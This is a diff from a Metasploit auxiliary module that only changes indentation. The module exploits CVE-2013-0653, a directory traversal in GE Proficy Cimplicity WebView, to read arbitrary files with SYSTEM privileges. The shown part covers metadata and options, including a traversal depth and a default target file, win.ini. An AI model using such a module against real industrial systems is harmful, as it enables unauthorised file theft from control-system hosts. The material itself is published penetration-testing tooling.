@@ -11,35 +11,35 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'=> 'GE Proficy Cimplicity WebView substitute.bcl Directory Traversal',
-      'Description' => %q{
+                      'Name'        => 'GE Proficy Cimplicity WebView substitute.bcl Directory Traversal',
+                      'Description' => %q{
         This module abuses a directory traversal in GE Proficy Cimplicity, specifically on the
         gefebt.exe component used by the WebView, in order to retrieve arbitrary files with SYSTEM
         privileges. This module has been tested successfully on GE Proficy Cimplicity 7.5.
       },
-      'Author'       =>
-        [
-          'Unknown', # Vulnerability discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2013-0653' ],
-          [ 'OSVDB', '89490' ],
-          [ 'BID', '57505' ],
-          [ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02' ]
-        ],
-      'DisclosureDate' => 'Jan 22 2013'))
+                      'Author'       =>
+                          [
+                              'Unknown', # Vulnerability discovery
+                              'juan vazquez' # Metasploit module
+                          ],
+                      'License'     => MSF_LICENSE,
+                      'References'  =>
+                          [
+                              [ 'CVE', '2013-0653' ],
+                              [ 'OSVDB', '89490' ],
+                              [ 'BID', '57505' ],
+                              [ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02' ]
+                          ],
+                      'DisclosureDate' => 'Jan 22 2013'))
 
     register_options(
-      [
-        Opt::RPORT(80),
-        OptString.new('TARGETURI',[true, 'Path to CimWeb', '/CimWeb']),
-        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
-        # By default gefebt.exe installed on C:\Program Files\GE Fanuc\Proficy CIMPLICITY\WebPages\CimWeb
-        OptInt.new('DEPTH', [true, 'Traversal depth', 5])
-      ])
+        [
+            Opt::RPORT(80),
+            OptString.new('TARGETURI',[true, 'Path to CimWeb', '/CimWeb']),
+            OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
+            # By default gefebt.exe installed on C:\Program Files\GE Fanuc\Proficy CIMPLICITY\WebPages\CimWeb
+            OptInt.new('DEPTH', [true, 'Traversal depth', 5])
+        ])
   end
 
   def normalize_uri(*strs)
